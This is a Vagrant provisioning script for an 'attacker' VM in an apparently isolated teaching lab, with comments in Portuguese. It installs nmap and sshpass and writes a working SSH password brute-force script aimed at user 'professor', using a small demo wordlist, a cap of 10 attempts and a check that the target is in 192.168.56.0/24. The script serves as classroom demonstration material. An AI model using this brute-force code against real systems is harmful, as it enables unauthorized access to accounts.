#!/usr/bin/env bash
set -e

export DEBIAN_FRONTEND=noninteractive

# Atualiza e instala ferramentas básicas para o atacante
apt-get update -y
apt-get upgrade -y

# Cliente ssh, nmap e utilitários
apt-get install -y openssh-client nmap net-tools curl

# Instala sshpass (apenas para demo em rede isolada) para permitir tentativas por senha não interativas.
# Aviso: sshpass facilita ataques por senha; só instalar em ambiente controlado para demonstração.
apt-get install -y sshpass

# Cria pasta compartilhada de resultados (host <-> VM)
mkdir -p /vagrant_shared/attacker_results
chown -R vagrant:vagrant /vagrant_shared

# Cria diretório local de scripts de demonstração
mkdir -p /home/vagrant/attack_scripts
chown -R vagrant:vagrant /home/vagrant/attack_scripts

# --- Cria o script de brute-force didático ---
cat > /home/vagrant/attack_scripts/brute_force.sh <<'BFS'
#!/usr/bin/env bash
# brute_force.sh
# Demo didática: tenta um pequeno wordlist de senhas no usuário 'professor' da victim.
# USAGE: ./brute_force.sh <target_ip> <wordlist_path>
# Segurança: aborta se target não estiver em rede privada 192.168.56.0/24

set -euo pipefail

TARGET="${1:-192.168.56.10}"
WORDLIST="${2:-/vagrant_shared/wordlists/passwords.txt}"
OUTLOG="/vagrant_shared/attacker_results/bruteforce_result.log"
TMPKEY="/home/vagrant/.ssh/id_demo"  # se for usar chave (opcional)

echo "=== brute_force.sh (demo) ===" | tee -a "$OUTLOG"
echo "Target: $TARGET" | tee -a "$OUTLOG"
echo "Wordlist: $WORDLIST" | tee -a "$OUTLOG"
echo "Time: $(date --iso-8601=seconds)" | tee -a "$OUTLOG"
echo "------" | tee -a "$OUTLOG"

# Safety check: only run inside 192.168.56.0/24
if [[ ! "$TARGET" =~ ^192\.168\.56\.[0-9]+$ ]]; then
  echo "[ERROR] Target $TARGET not in allowed private range 192.168.56.0/24. Aborting." | tee -a "$OUTLOG"
  exit 2
fi

# Ensure wordlist exists and is small (didactic)
if [ ! -f "$WORDLIST" ]; then
  echo "[INFO] Wordlist not found at $WORDLIST. Creating a tiny demo wordlist." | tee -a "$OUTLOG"
  mkdir -p "$(dirname "$WORDLIST")"
  cat > "$WORDLIST" <<EOF
123456
password
prof123
toor
admin
EOF
fi

# Limit attempts: for demo, try at most first 10 lines
MAX_TRIES=10
TRY=0
SUCCESS=0

while read -r PASS && [ $TRY -lt $MAX_TRIES ]; do
  TRY=$((TRY+1))
  echo "[TRY $TRY] attempting password: $PASS" | tee -a "$OUTLOG"

  # Use sshpass to attempt password (connect timeout short). StrictHostKeyChecking=no to avoid interactive trust prompt.
  if sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=no -q professor@"$TARGET" 'echo "LOGIN_OK"' 2>/dev/null | grep -q "LOGIN_OK"; then
    echo "[SUCCESS] password found: $PASS" | tee -a "$OUTLOG"
    SUCCESS=1
    echo "$PASS" > /vagrant_shared/attacker_results/found_password.txt
    break
  else
    echo "[FAIL] $PASS" | tee -a "$OUTLOG"
  fi
done < "$WORDLIST"

if [ "$SUCCESS" -eq 0 ]; then
  echo "[RESULT] No password found in first $MAX_TRIES attempts." | tee -a "$OUTLOG"
else
  echo "[RESULT] Success — check /vagrant_shared/attacker_results/found_password.txt" | tee -a "$OUTLOG"
fi

echo "End time: $(date --iso-8601=seconds)" | tee -a "$OUTLOG"
BFS

# garante permissões e dono
chmod +x /home/vagrant/attack_scripts/brute_force.sh
chown -R vagrant:vagrant /home/vagrant/attack_scripts

# Touch result file to ensure shared path exists
touch /vagrant_shared/attacker_results/attack.log
chown vagrant:vagrant /vagrant_shared/attacker_results/attack.log || true

echo "Provision attacker finished at $(date)" > /vagrant_shared/attacker_provision_done.txt

